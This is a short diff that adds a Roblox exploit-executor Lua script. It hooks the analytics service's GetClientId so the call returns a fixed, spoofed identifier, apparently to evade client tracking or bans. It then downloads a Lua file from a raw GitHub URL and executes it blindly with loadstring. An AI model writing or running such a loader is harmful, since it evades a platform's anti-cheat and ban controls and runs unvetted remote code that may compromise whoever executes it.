@@ -1,0 +1,5 @@
+local old
+old = hookfunction(game:GetService("RbxAnalyticsService").GetClientId, function()
+    return "f1466985-c7ee-445a-a26c-1598879382e0"
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pijiaobenMSJMleng/ehhdvdhd/refs/heads/main/Advanced%20Logic.lua"))()
